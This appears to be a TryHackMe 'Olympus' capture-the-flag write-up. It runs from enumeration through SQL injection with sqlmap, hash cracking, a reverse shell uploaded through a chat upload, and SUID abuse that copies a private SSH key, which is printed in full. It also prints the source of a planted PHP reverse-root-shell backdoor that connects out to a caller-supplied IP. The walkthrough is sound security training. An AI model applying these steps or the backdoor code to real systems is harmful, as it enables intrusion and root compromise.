@@ -1,0 +1,512 @@
+--------------------------OLYMPUS ROOM TRYHACKME---------------------------
+
+----------> enumeration
+
+nmap -sC -sV -T4 -Pn 10.10.46.228
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 04:01 GMT
+Nmap scan report for 10.10.46.228
+Host is up (0.21s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 1c:2c:1b:59:88:b6:5e:a0:04:f0:01:1d:81:02:8e:35 (RSA)
+|   256 40:7d:46:42:1b:29:b8:ff:20:52:d2:d2:42:39:84:6a (ECDSA)
+|_  256 db:f7:12:0f:d9:d8:d1:78:aa:bb:fd:10:9c:30:eb:3e (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Did not follow redirect to http://olympus.thm
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+---> Web server enumeration
+ gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x php
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 276]
+/.hta.php             (Status: 403) [Size: 276]
+/.htaccess.php        (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd.php        (Status: 403) [Size: 276]
+/index.php            (Status: 200) [Size: 1948]
+/index.php            (Status: 200) [Size: 1948]
+/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
+/phpmyadmin           (Status: 403) [Size: 276]
+/server-status        (Status: 403) [Size: 276]
+/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
+/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
+Progress: 9492 / 9492 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+Now accessing to the last one
+Now i access to this http://olympus.thm/~webmaster/index.php
+
+We see this message : Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.
+		As I remind you, we have a wordlist of forbidden password that you should use.
+		Please update your passwords.
+
+i noticed that in the search bar when i put ' i get this message
+
+Query FailYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND post_status='publish'' at line 1
+
+We know that it is vulnerable to sql injection let us try it. I intercept the request with burpsiuite and launch sqlmap
+
+sqlmap -r req --dbs
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+
+
+sqlmap -r req -D olympus --tables
++------------+
+| categories |
+| chats      |
+| comments   |
+| flag       |
+| posts      |
+| users      |
++------------+
+
+sqlmap -r req -D olympus -T flag --dump
++---------------------------+
+| flag                      |
++---------------------------+
+| flag{Sm4rt!_k33P_d1gGIng} |
++---------------------------+
+
+
+ sqlmap -r req -D olympus -T users --dump
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
+| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
+| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+
+So let me try cracking hashes
+
+cat hash.txt 
+prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
+root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
+zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/olympus]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+summertime       (prometheus) 
+
+i get one person password
+
+We connect but nothing so we come back to see what is in the chat table
+
+sqlmap -r req -D olympus -T chats --dump
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+| dt         | msg                                                                                                                                                             | uname      | file                                 |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+
+
+
+
+Let us add chat as a subdomain to see
+
+Good it works so i get connected into chat vhost with prometeus credentials let me search for the content of files
+
+gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://chat.olympus.thm/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 281]
+/.hta                 (Status: 403) [Size: 281]
+/.htpasswd            (Status: 403) [Size: 281]
+/index.php            (Status: 302) [Size: 0] [--> login.php]
+/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
+/phpmyadmin           (Status: 403) [Size: 281]
+/server-status        (Status: 403) [Size: 281]
+/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
+/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
+Progress: 4746 / 4746 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Let us see the uploads folder
+
+So i will try uploading a reverse shell and see
+
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+| dt         | msg                                                                                                                                                             | uname      | file                                 |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
+| 2025-09-30 | Attached : shell.php                                                                                                                                            | prometheus | efbcdba6dd6502d29ff8195a16fcb244.php |
+| 2025-09-30 | hello                                                                                                                                                           | prometheus | <blank>                              |
+| 2025-09-30 | Attached : shell.php                                                                                                                                            | prometheus | 5907738474311a2c96ec17806bc8405d.php |
+| 2025-09-30 | Attached : toto.txt                                                                                                                                             | prometheus | b4ba049d30bbd56f9313bdcf25dcef01.txt |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
+
+we see that the system changes our file name
+
+let us get the reverse shell
+
+rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.11.127.125] from (UNKNOWN) [10.10.40.74] 40374
+Linux ip-10-10-40-74 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 07:37:27 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
+bash: cannot set terminal process group (842): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-10-40-74:/$ whoami
+whoami
+www-data
+www-data@ip-10-10-40-74:/$ 
+
+
+We get our reverse shell let us see if we found sth interesting
+
+-r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt
+www-data@ip-10-10-40-74:/home/zeus$ cat user.flag
+cat user.flag
+flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
+www-data@ip-10-10-40-74:/home/zeus$ cat zeus.txt
+cat zeus.txt
+Hey zeus !
+
+
+I managed to hack my way back into the olympus eventually.
+Looks like the IT kid messed up again !
+I've now got a permanent access as a super user to the olympus.
+
+
+
+						- Prometheus.
+www-data@ip-10-10-40-74:/home/zeus$ 
+
+
+we get the flag let us continue
+
+						- Prometheus.
+www-data@ip-10-10-40-74:/home/zeus$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/cputils
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/su
+
+
+www-data@ip-10-10-40-74:/home/zeus$ /usr/bin/cputils
+/usr/bin/cputils
+  ____ ____        _   _ _     
+ / ___|  _ \ _   _| |_(_) |___ 
+| |   | |_) | | | | __| | / __|
+| |___|  __/| |_| | |_| | \__ \
+ \____|_|    \__,_|\__|_|_|___/
+                               
+Enter the Name of Source File: /home/zeus/.ssh/id_rsa
+                               /home/zeus/.ssh/id_rsa
+
+Enter the Name of Target File: id_rsa
+                               id_rsa
+
+File copied successfully.
+www-data@ip-10-10-40-74:/home/zeus$ ls
+                                    ls
+ls
+id_rsa
+snap
+user.flag
+zeus.txt
+www-data@ip-10-10-40-74:/home/zeus$ cat id_rsa
+                                    cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+eRZjPBIy1rjIUiWe6LS1ToEyqfY=
+-----END OPENSSH PRIVATE KEY-----
+www-data@ip-10-10-40-74:/home/zeus$ 
+
+
+
+now let us use this to connect as zeus
+
+ssh2john id_rsa > id_rsa_hashes         
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/olympus]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hashes 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+snowflake        (id_rsa)     
+1g 0:00:01:18 DONE (2025-09-30 07:59) 0.01276g/s 19.20p/s 19.20c/s 19.20C/s maurice..bunny
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/olympus]
+└─$ chmod 600 id_rsa                                              
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/olympus]
+└─$ ssh zeus@10.10.40.74 -i id_rsa                                
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 30 Sep 2025 07:59:56 AM UTC
+
+  System load:  0.0               Processes:             114
+  Usage of /:   44.7% of 9.75GB   Users logged in:       0
+  Memory usage: 77%               IPv4 address for eth0: 10.10.40.74
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sat Jul 16 07:52:39 2022
+zeus@ip-10-10-40-74:~$ 
+
+
+let us continue
+
+zeus@ip-10-10-40-74:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
+total 12
+drwxrwx--x 2 root     zeus     4096 Jul 15  2022 .
+drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
+-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
+-rwxr-xr-x 1 root     zeus     1589 Jul 15  2022 VIGQFQFMYOST.php
+zeus@ip-10-10-40-74:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php
+<?php
+$pass = "a7c5ffcf139742f52a5267c4a0674129";
+if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');
+
+set_time_limit(0);
+
+$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
+if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
+$ip = $_GET["ip"]; $port = $_GET["port"];
+
+$write_a = null;
+$error_a = null;
+
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
+
+chdir("/"); umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if(!$sock) die("couldn't open socket");
+
+$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
+$proc = proc_open($shell, $fdspec, $pipes);
+
+if(!is_resource($proc)) die();
+
+for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
+stream_set_blocking($sock, 0);
+
+while(1)
+{
+    if(feof($sock) || feof($pipes[1])) break;
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
+    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
+    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
+}
+
+fclose($sock);
+for($x=0;$x<=2;$x++) fclose($pipes[x]);
+proc_close($proc);
+?>
+
+
+i cracked the password and i found this 
+
+a7c5ffcf139742f52a5267c4a0674129 --> secured but it was not necessary
+
+i go here http://10.10.40.74/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php and i put the hash as password and i get this message 
+
+snodew reverse root shell backdoor
+Usage:
+Locally: nc -vlp [port]
+Remote: 10.10.40.74/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=[destination of listener]&port=[listening port]
+
+
+so i decide to get my reverse shell using this 
+
+10.10.40.74/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=[10.11.127.125]&port=[1234] but nothing when i come back in the script i see that we have this which is the final execution
+
+
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
+
+so let me do it
+
+uname -a; w; /lib/defended/libc.so.99
+
+uname -a; w; /lib/defended/libc.so.99
+Linux ip-10-10-40-74 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 08:14:11 up  1:39,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+zeus     pts/0    10.11.127.125    07:59    1.00s  0.05s  0.00s w
+# whoami
+root
+# cd /root
+# ls
+config	root.flag  snap
+# cat root.flag
+                    ### Congrats !! ###
+
+
+
+
+                            (
+                .            )        )
+                         (  (|              .
+                     )   )\/ ( ( (
+             *  (   ((  /     ))\))  (  )    )
+           (     \   )\(          |  ))( )  (|
+           >)     ))/   |          )/  \((  ) \
+           (     (      .        -.     V )/   )(    (
+            \   /     .   \            .       \))   ))
+              )(      (  | |   )            .    (  /
+             )(    ,'))     \ /          \( `.    )
+             (\>  ,'/__      ))            __`.  /
+            ( \   | /  ___   ( \/     ___   \ | ( (
+             \.)  |/  /   \__      __/   \   \|  ))
+            .  \. |>  \      | __ |      /   <|  /
+                 )/    \____/ :..: \____/     \ <
+          )   \ (|__  .      / ;: \          __| )  (
+         ((    )\)  ~--_     --  --      _--~    /  ))
+          \    (    |  ||               ||  |   (  /
+                \.  |  ||_             _||  |  /
+                  > :  |  ~V+-I_I_I-+V~  |  : (.
+                 (  \:  T\   _     _   /T  : ./
+                  \  :    T^T T-+-T T^T    ;<
+                   \..`_       -+-       _'  )
+                      . `--=.._____..=--'. ./          
+
+
+
+
+                You did it, you defeated the gods.
+                        Hope you had fun !
+
+
+
+                   flag{D4mN!_Y0u_G0T_m3_:)_}
+                   
+                   
+
+
+
+
+PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)
+
+                  (Hint : regex can be usefull)
+# 
+
+
+
+
+We have the 4th flag it rest the last one the hist said that it is in /etc so let us get it
+
+# grep -r "flag" .
+./manpath.config:#DEFINE		whatis_grep_flags		-i
+./manpath.config:#DEFINE		apropos_grep_flags		-iEw
+./manpath.config:#DEFINE		apropos_regex_grep_flags	-iE
+./ssl/private/.b0nus.fl4g:Here is the final flag ! Congrats !
+./ssl/private/.b0nus.fl4g:flag{Y0u_G0t_m3_g00d!}
